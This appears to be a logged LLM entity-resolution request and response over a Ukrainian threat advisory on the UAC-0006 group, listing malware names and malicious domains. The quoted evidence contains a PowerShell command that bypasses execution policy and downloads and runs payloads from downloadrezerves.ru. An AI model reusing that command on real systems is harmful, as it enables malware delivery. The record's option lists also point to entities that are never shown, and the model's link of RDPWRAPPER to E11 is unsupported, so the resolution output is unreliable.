=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Зведена інформація щодо діяльності угрупування UAC-0006 станом на 01.12.2023" — evidence: S1. "ння інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема:</p><ul><li>SMOKELOADER</li><li>LOADERX3</li><li>RMS</li><li>RDPWRAPPER</li><li>DANABOT</li><li>LUMMASTEALER</li><li>REDLINESTEALER</li><li>SYSTEMBC</li><li>TALESHOT</li><li>PIEJET</li><li>LOADNEST</li><li>HANGTHREAD</li><li>BACKSTAB</li><li>AUKILL</li></ul><p><br></p><p>Загалом, після первинного ураження ЕОМ і доставки SMOKELOADER, останній використовується для завантаження і запуску на ЕОМ інш" S2. "utionPolicy Bypass -File %TMP%\pssD713.ps1 $path = $Env:temp+'\AsmLUkHt.exe'; $client = New-Object System.Net.WebClient; $client.downloadfile('hXXp://downloadrezerves.ru/download11/mstsc.exe',$path); Start-Process -FilePath $path IEX (New-Object Net.Webclient).downloadstring("hXXp://downloadrezerves.ru/index.php") %SY"
Entities:
E1. Loader.dll
E132. docs.googie.com.ssl3.online
E133. kew.1qw.us
E134. com.getssl.ink
E135. com.personlog.in
E136. complainnykso.shop
E137. kew.8df.us
E138. connectssl.in
E139. school-hudojniku.eu
E140. konkurs-vesna24.ru
E141. vikompalion.ru
E142. delta.milgov.site
E143. data.exmo.day
E144. docs.googledrive.com.ssl2.site
E145. ua-ditinstvo.pics
E146. exceptions.exmo.day
E147. dytitvorchist.pics
E148. president-petitions.click
E149. drive.googie.com.ssl2.site
E150. konkurs-deti-uah.eu
E151. konkurs-vesna.info
E152. play.google2.certifiedauth.in
E153. lh3.google2.certifiedauth.in
E154. hudojnikuah-sch.eu
E155. sc-hudojnik.eu
E156. hostpro.ua
E157. sowakiev.eu
E158. devtools.bond
E159. deti-golos-ua.pics
E160. s3-atlassian.cloud
E161. e-nas.firstcloudit.com
E162. docs.googleauth.com.ssl3.site
E163. personlog.in
E164. kids-dreams.eu
E165. mails.support
E166. ns2.getssl.click
E167. filedn.eu
E168. authssl.site
E169. dhl.redirecl.com
E170. ns1.getssl.click
E171. konkursi-ua.eu
E172. konkursi-uah.eu
E173. empoweringparents.shop
E174. nk.1qw.us
E175. crazykids.pics
E176. crmeds.com
E177. bahouholdings.com
E178. lotus-kiev.eu
E179. lotuskiev.eu
E180. milekiev.eu
E181. funedunet.com
E182. drive.google.com
E183. drive.googles.com.personlog.in
E184. gdrive.com.ssl2.site
E185. aws-secure.cloud
E186. baletua.eu
E187. secure.certifiedauth.in
E188. www3.google2.certifiedauth.in
E189. baletua.pro
E190. ua-sec.cloud
E191. nas-files.firstcloudit.com
E192. messenger.certifiedauth.in
E193. netman.servehttp.com
E194. r4.res.certifiedauth.in
E195. messenger.exmo.day
E196. res.certifiedauth.in
E197. superops.ai
E198. stellar.account-viewer.com
E199. docs.google.com.ssl3.site
E200. protectconnections.com
E201. static.personlog.in
E202. superops.com
E203. school-uahudojniku.eu
E204. uahvibir-hudojniku.eu
E205. hudojnik-malunki-uah.eu
E206. unetset.com
E207. hudojnik-diti-ua.eu
E208. files.ukr.net.ssl4.online
E209. s3-blackberry.cloud
E210. files.ukr.net.ssl2.online
E211. files.ukr.net.ssl2.in
E212. authcheck.in
E213. govps.cloud
E214. againandagaingmorder.ru
E215. bloockflad.pw
E216. bluepablo.fun
E217. boddyshow.fun
E218. bookgames.pw
E219. comperssw.fun
E220. coudzoom.ru
E221. dayzilons.pw
E222. downloadrezerves.ru
E223. duhodown.fun
E224. howlcars.fun
E225. keewoolas.pw
E226. killredls.pw
E227. kowersize.fun
E228. moskhoods.pw
E229. mouseoiet.fun
E230. plengreg.fun
E231. revivalsecularas.pw
E232. rms-server.tektonit.ru
E233. steycools.pw
E234. superdadymster.ru
E235. unayt.ru
E236. zamesblack.fun
E237. cafeteriumups.ru
E238. africathrillthes.pw
E239. Ukrainian logistics companies
E240. підприємств оборонно-промислового комплексу [aka Підприємства оборонно-промислового комплексу, українські оборонні підприємства, Ukrainian defense enterprises]
E241. Ukrainian enterprises and sole proprietors
E242. Ukrainian government sector
E243. Ukrainian energy sector
E244. Ukrainian providers
E245. Ukrainian organizations
E246. Ukrainian water supply sector
E247. Ukrainian heat supply sector
E248. Ukrainian government officials
Mentions:
M1. "LOADERX3" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "RDPWRAPPER" (Software) — options: E11, E12, E5, E13 — ctx: S1
M3. "DANABOT" (Software) — options: E20, E21, E22, E23 — ctx: S1
M4. "REDLINESTEALER" (Software) — options: E30, E31, E10, E32 — ctx: S1
M5. "SYSTEMBC" (Software) — options: E37, E38, E39, E40 — ctx: S1
M6. "PIEJET" (Software) — options: E44, E45, E46, E47 — ctx: S1
M7. "LOADNEST" (Software) — options: E1, E2, E52, E3 — ctx: S1
M8. "HANGTHREAD" (Software) — options: E20, E8, E56, E57 — ctx: S1
M9. "BACKSTAB" (Software) — options: E59, E31, E39, E62 — ctx: S1
M10. "AUKILL" (Software) — options: E67, E68, E28, E69 — ctx: S1
M11. "africathrillthes.pw" (Domain) — options: E84, E85, E86, E87
M12. "againandagaingmorder.ru" (Domain) — options: E94, E95, E96, E97
M13. "bloockflad.pw" (Domain) — options: E104, E105, E100, E106
M14. "bluepablo.fun" (Domain) — options: E112, E113, E100, E114
M15. "boddyshow.fun" (Domain) — options: E113, E116, E117, E115
M16. "bookgames.pw" (Domain) — options: E125, E112, E126, E127
M17. "comperssw.fun" (Domain) — options: E133, E134, E135, E113
M18. "coudzoom.ru" (Domain) — options: E94, E95, E102, E139
M19. "dayzilons.pw" (Domain) — options: E108, E142, E143, E144
M20. "downloadrezerves.ru" (Domain) — options: E94, E95, E140, E150 — ctx: S2
M21. "duhodown.fun" (Domain) — options: E152, E113, E116, E127
M22. "howlcars.fun" (Domain) — options: E149, E156, E113, E114
M23. "keewoolas.pw" (Domain) — options: E133, E158, E137, E159
M24. "killredls.pw" (Domain) — options: E119, E164, E165, E166
M25. "kowersize.fun" (Domain) — options: E133, E171, E113, E137
M26. "moskhoods.pw" (Domain) — options: E154, E122, E120, E168
M27. "mouseoiet.fun" (Domain) — options: E114, E178, E116, E113
M28. "plengreg.fun" (Domain) — options: E108, E102, E113, E137
M29. "revivalsecularas.pw" (Domain) — options: E84, E96, E185, E108
M30. "rms-server.tektonit.ru" (Domain) — options: E103, E95, E191, E192
M31. "steycools.pw" (Domain) — options: E108, E158, E144, E197
M32. "superdadymster.ru" (Domain) — options: E94, E95, E202, E103
M33. "unayt.ru" (Domain) — options: E204, E95, E98, E205
M34. "zamesblack.fun" (Domain) — options: E208, E113, E209, E210
M35. "cafeteriumups.ru" (Domain) — options: E94, E95, E102, E203
M36. "Ukrainian enterprises" (Sector) — options: E239, E240, E241, E242

=== RESPONSE (6.5s, in 5193 / out 625 tok, STOP) ===
{"m":"M1","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M2","id":"E11","g":null}
{"m":"M3","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M4","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M5","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M6","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M7","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M8","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M9","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M10","id":"NEW","g":"specialized program used in computer infections"}
{"m":"M11","id":"NEW","g":null}
{"m":"M12","id":"NEW","g":null}
{"m":"M13","id":"NEW","g":null}
{"m":"M14","id":"NEW","g":null}
{"m":"M15","id":"NEW","g":null}
{"m":"M16","id":"NEW","g":null}
{"m":"M17","id":"NEW","g":null}
{"m":"M18","id":"NEW","g":null}
{"m":"M19","id":"NEW","g":null}
{"m":"M20","id":"NEW","g":"domain hosting malicious downloads"}
{"m":"M21","id":"NEW","g":null}
{"m":"M22","id":"NEW","g":null}
{"m":"M23","id":"NEW","g":null}
{"m":"M24","id":"NEW","g":null}
{"m":"M25","id":"NEW","g":null}
{"m":"M26","id":"NEW","g":null}
{"m":"M27","id":"NEW","g":null}
{"m":"M28","id":"NEW","g":null}
{"m":"M29","id":"NEW","g":null}
{"m":"M30","id":"NEW","g":null}
{"m":"M31","id":"NEW","g":null}
{"m":"M32","id":"NEW","g":null}
{"m":"M33","id":"NEW","g":null}
{"m":"M34","id":"NEW","g":null}
{"m":"M35","id":"NEW","g":null}
{"m":"M36","id":"NEW","g":null}
